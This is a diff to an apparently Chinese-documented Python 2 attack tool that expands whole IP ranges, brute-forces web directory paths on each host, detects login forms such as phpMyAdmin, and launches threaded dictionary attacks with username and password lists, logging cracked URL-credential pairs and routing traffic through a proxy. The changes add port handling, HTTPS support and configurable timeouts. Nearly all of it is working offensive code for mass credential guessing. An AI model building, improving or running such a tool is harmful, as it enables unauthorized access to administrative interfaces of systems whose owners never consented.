@@ -19,9 +19,17 @@ from multiprocessing import Process
 #def setArgs():
 
 def valiteIp(subIpStr):
-    tmp = subIpStr.split('.')
-    if 4 != len(tmp):
-        return False
+    tmp = []
+
+    if ':' in subIpStr:
+        tmp += subIpStr.split('.')[0:3] + subIpStr.split('.')[-1].split(':')
+        if 5 != len(tmp):
+            return False
+    else:
+        tmp += subIpStr.split('.')
+        if 4 != len(tmp):
+            return False
+
     for i in tmp:
         if False == i.isdigit():
             return False
@@ -30,29 +38,65 @@ def valiteIp(subIpStr):
 
 def genIpSubFromSlash(ipSubStr):
     result = []
-    tmp = ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('/')
+    tmp = []
+    flag = False
+
+    if ':' in ipSubStr:
+        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[-1].split('/')[0:1] + ipSubStr.split('.')[-1].split('/')[1].split(':')
+        flag = True
+    else:
+        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('/')
+
     for i in tmp:
         if False == i.isdigit():
             return result
 
     if '24' == tmp[4]:
         for i in range(1, 255, 1):
-            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
+            ip = ''
+            if True == flag:
+                ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i) + ':' + tmp[5]
+            else:
+                ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
             result.append(ip)
     elif '16' == tmp[4]:
         for i in range(0, 255, 1):
             for j in range(1, 255, 1):
-                ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j)
+                ip = ''
+                if True == flag:
+                    ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j) + ':' + tmp[5]
+                else:
+                    ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j)
                 result.append(ip)
     elif '8' == tmp[4]:
         for i in range(0, 255, 1):
             for j in range(0, 255, 1):
                 for k in range(1, 255, 1):
-                    ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k)
+                    ip = ''
+                    if True == flag:
+                        ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k) + ':' + tmp[5]
+                    else:
+                        ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k)
                     result.append(ip)
     else:
         return result
     return result
+
+def combinIp(iL):
+    length = len(iL)
+    result = []
+    for i in iL:
+        if False == i.isdigit():
+            return result
+
+    if 4 == length:
+        ip = iL[0] + '.' + iL[1] + '.' + iL[2] + '.' + iL[3]
+        result.append(ip)
+        return result
+    if 5 == length:
+        ip = iL[0] + '.' + iL[1] + '.' + iL[2] + '.' + iL[3] + ':' + iL[4]
+        result.append(ip)
+        return result
 
 def genIpSubFromComma(subIpStr):
     result = []
@@ -84,19 +128,42 @@ def genIpSubFromComma(subIpStr):
 
 def genIpSubFromBar(ipSubStr):
     result = []
-    tmp = ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('-') 
-    #if 
+    tmp = []
+    flag = False
+
+    if ':' in ipSubStr:
+        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[-1].split('-')[0:1] + ipSubStr.split('.')[-1].split('-')[1].split(':')
+        flag = True
+    else:
+        tmp += ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('-') 
+
     for i in tmp:
         if False == i.isdigit():
             return result
 
     for i in range(int(tmp[3]), (int(tmp[4]) + 1), 1):
-        ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
+        ip = ''
+        if True == flag:
+            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i) + ':' + tmp[5]
+        else:
+            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
         result.append(ip)
 
     return result
-def genIpList(ipSubStr):
-    return genIpSubFromComma(ipSubStr)
+
+def genIpList(ipSubStr, port):
+    tmp = genIpSubFromComma(ipSubStr)
+#    for i in tmp:
+#        print i
+    if None != tmp and 0 < len(tmp) and '80' != port:
+        for i in range(len(tmp)):
+            if ':' not in tmp[i]:
+                tmp[i] = tmp[i] + ':' + port
+
+
+    return tmp
+
+
 
 def isHostLiving(ip):
     try:
@@ -238,44 +305,61 @@ def getLoginFormArgs(resp):
     return actionUrl, resp.cookies, userName, passwd, otherArgs
 
 def bruteDir(ipLine, dirList, bruteDirThreadConfig):
-    isHttp = False
-    isHttps = False
     resp = ''
     url = ''
-    urls = ''
+    baseUrl = ''
 
     loginThreadConfig = {}
     loginThreadConfig['users'] = bruteDirThreadConfig['users']
     loginThreadConfig['passwds'] = bruteDirThreadConfig['passwds']
     loginThreadConfig['out'] = bruteDirThreadConfig['out']
     loginThreadConfig['fc'] = bruteDirThreadConfig['fc']
+    loginThreadConfig['timeout'] = bruteDirThreadConfig['timeout']
+
+    timeOut = bruteDirThreadConfig['timeout']
+    connectTimeOut = int(timeOut.split(',')[0])
+    readDataTimeOut = int(timeOut.split(',')[1])
 
 #    if False == isHostLiving(ipLine):
 #        return
-#
+
+    if ':' in ipLine:
+        port = ipLine.split(':')[-1]
+        if '80' != port:
+            if '443' == port:
+                url = 'https://' + ipLine.split(':')[0]
+            else:
+                url = 'http://' + ipLine
+        else:
+            url = 'http://' + ipLine.split(':')[0]
+
+    else:
+        url = 'http://' + ipLine
+
+    baseUrl = url
+
     for dirItem in dirList:
         
         if '/' != dirItem[0]: 
-            url = 'http://' + ipLine + '/' + dirItem
+            url = url + '/' + dirItem
         else:
-            url = 'http://' + ipLine + dirItem 
+            url = url + dirItem 
         
         if '/' != url[-1]:
             url = url + '/'
 
         try:
-            resp = requests.get(url, timeout = (1, 3))
+            
+            resp = requests.get(url, timeout = (connectTimeOut, readDataTimeOut))
             if 200 == resp.status_code:
                 with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                     surlFile.writelines(url + '\n')
                     surlFile.close()
                 sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
-                isHttp = True
-                isHttps = False
                 try:
                     actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
                     if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
-                        if 'http://' != actionUrl[0:7]:
+                        if 'http://' != actionUrl[0:7]  and 'https://' != actionUrl[0:8]:
                             if '/' != actionUrl[0]:
                                 actionUrl = url + '/' + actionUrl
                             else:
@@ -286,9 +370,8 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
                         t.start()
                         t.join()
 
-                        #login(actionUrl, cookies, userName, passwd, otherArgs)
                     else:
-                        sys.stdout.write(colored('actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
+                        sys.stdout.write(colored('something error! actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
                 except Exception, e:
                     sys.stdout.write(str(e) + '\n')
                 break
@@ -298,50 +381,6 @@ def bruteDir(ipLine, dirList, bruteDirThreadConfig):
 
         except Exception, e:
             sys.stdout.write(colored(url + ' [connect-error]\n', 'red'))
-        
-        if '/' != dirItem[0]: 
-            urls = 'https://' + ipLine + '/' + dirItem
-        else:
-            urls = 'https://' + ipLine + dirItem
-        
-        if '/' != urls[-1]:
-            urls = urls + '/'
-        
-        try:
-            resp = requests.get(urls, timeout = (1, 3))
-            if 200 == resp.status_code:
-                with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
-                    surlFile.writelines(urls + '\n')
-                    surlFile.close()
-                sys.stdout.write(colored(urls + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
-                isHttp = False
-                isHttps = True
-                try:
-                    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
-                    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
-                        if 'http://' != actionUrl[0:7]:
-                            if '/' != actionUrl[0]:
-                                actionUrl = urls + '/' + actionUrl
-                            else:
-                                actionUrl = urls + actionUrl
-                        t = threading.Thread(loginThreadConfig, target=login, args=(actionUrl, cookies, userName, passwd, otherArgs, ))
-                        t.setDaemon(True)
-                        t.start()
-                        t.join()
-                        login(actionUrl, cookies, userName, passwd, otherArgs)
-                    else:
-                        sys.stdout.write(colored('actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n', 'red'))
-                except Exception, e:
-                    sys.stdout.write(str(e) + '\n')
-                break
-            else:
-                sys.stdout.write(colored(urls + " [status_code:" + str(resp.status_code) + ']\n', 'yellow'))
-
-        except Exception, e:
-            sys.stdout.write(colored(urls + ' [connect-error] ' + str(e) + '\n', 'red'))
-
-        url = ''
-        urls = ''
     
     return
 
@@ -352,26 +391,6 @@ def quit(signum, frame):
 def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
     signal.signal(signal.SIGINT, quit)
     signal.signal(signal.SIGTERM, quit)
-#    threads = []
-#    for ipLine in subIpList:
-#        try:
-#            t = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
-#            threads.append(t)
-#        except Exception, e:
-#            sys.stdout.write(str(e) + '\n')
-#
-#    try:
-#        for thread in threads:
-##            thread.setDaemon(True)
-#            thread.start()
-#            thread.join()
-#            #time.sleep(1)
-##        while True:
-##            pass
-#
-#    except Exception, e:
-#        sys.stdout.write(str(e) + '\n')
-#    return
     
     if bruteDirThreadConfig['tn'] > cpuCnt:
         cpuCnt = bruteDirThreadConfig['tn']
@@ -419,32 +438,34 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
     parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
     parser.add_argument('-ipsb', help='指定目标ip段（如:1.2.3.4/24 或者 1.2.3.4-200）')
+    parser.add_argument('-port', default = '80',
+                                    help='指定端口.(默认:80')
 
-    parser.add_argument('-dirs', default = "configs/dirs-lists/dir-list.txt",
+    parser.add_argument('-dirs', default = 'configs/dirs-lists/dir-list.txt',
                                     help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')
 
-    parser.add_argument('-users', default = "configs/users-lists/users-list.txt",
+    parser.add_argument('-users', default = 'configs/users-lists/users-list.txt',
                                     help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/users-list.txt)')
 
-    parser.add_argument('-passwds', default = "configs/passwds-lists/comment-passwds.txt",
+    parser.add_argument('-passwds', default = 'configs/passwds-lists/comment-passwds.txt',
                                     help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')
 
-    parser.add_argument('-proxy', default = "http://127.0.0.1:8118",
+    parser.add_argument('-proxy', default = 'http://127.0.0.1:8118',
                                     help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')
 
-    parser.add_argument('-success', default = "configs/success-list/comment-success.txt",
+    parser.add_argument('-success', default = 'configs/success-list/comment-success.txt',
                                     help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')
 
-    parser.add_argument('-failed', default = "configs/failed-lists/comment-failed.txt",
+    parser.add_argument('-failed', default = 'configs/failed-lists/comment-failed.txt',
                                     help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')
 
-    parser.add_argument('-out', default = "url-user-passwd-pair.txt",
+    parser.add_argument('-out', default = 'url-user-passwd-pair.txt',
                                     help='指定爆破登录成功后将登录URL和对应的用户名以及密码保存到文件.(默认:url-user-passwd-pair.txt)')
 
-    parser.add_argument('-surl', default = "success-urls.txt",
+    parser.add_argument('-surl', default = 'success-urls.txt',
                                     help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')
 
-    logfile = "logs/" + time.strftime("%Y-%m-%d-%H:%M:%S", time.localtime()) + "-log.txt"
+    logfile = 'logs/' + time.strftime('%Y-%m-%d-%H:%M:%S', time.localtime()) + '-log.txt'
     parser.add_argument('-logfile', default = logfile,
                                     help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')
 
@@ -456,6 +477,9 @@ if __name__ == '__main__':
     
     parser.add_argument('-tn', default=cpuCnt, type=int,
                                     help='指定线程数')
+
+    parser.add_argument('-timeout', default='1,3',
+                                    help='指定超时参数，默认为:1,3. 1是指连接超时时间为1秒，3是指读取数据的超时时间为3秒. 超时将触发超时错误然后略过该ip.')
 #    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
 #    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')
 
@@ -480,7 +504,7 @@ if __name__ == '__main__':
             ipsfFile.close()
     else:
         ipsb = args.ipsb
-        ipList = genIpList(ipsb)
+        ipList = genIpList(ipsb, args.port)
 
 #    print 'scan ip list:'
 #    for i in ipList:
@@ -503,6 +527,7 @@ if __name__ == '__main__':
     bruteDirThreadConfig['fc'] = args.fc
     bruteDirThreadConfig['out'] = args.out
     bruteDirThreadConfig['tn'] = args.tn
+    bruteDirThreadConfig['timeout'] = args.timeout
 
     if cpuCnt > len(ipList):
         #proccess = Process(target = subWorkers, args=(cpuCnt, ipList, dirList, bruteDirThreadConfig, ))
